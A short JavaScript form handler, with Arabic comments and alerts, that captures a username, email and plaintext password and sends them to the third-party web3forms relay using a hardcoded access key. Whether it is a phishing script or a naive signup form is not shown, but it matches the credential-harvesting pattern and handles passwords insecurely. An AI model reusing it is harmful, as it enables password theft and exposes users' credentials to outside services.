let password;
let email;
let username;
const myForm = document.getElementById("hjl");

myForm.onsubmit = function(event) {
    event.preventDefault(); 
    
    // سحب القيم من العناصر
    password = document.getElementById("pass").value;
    email = document.getElementById("myemail").value;
    username = document.getElementById("myusername").value;

    // تجهيز البيانات للإرسال
    const formData = new FormData();
    formData.append("access_key", "39811b50-6061-41cd-bd7b-d07bc23738d1");
    formData.append("username", username);
    formData.append("email", email);
    formData.append("password", password);

    // عملية الإرسال الفعلي
    fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (response.ok) {
            alert("مبروك يا يوسف! تم إرسال المعلومات بنجاح.");
            myForm.reset(); // تصفير الفورم
        } else {
            alert("حدث خطأ، تأكد من اتصال الإنترنت.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("فشل الاتصال بالسيرفر.");
    });
};


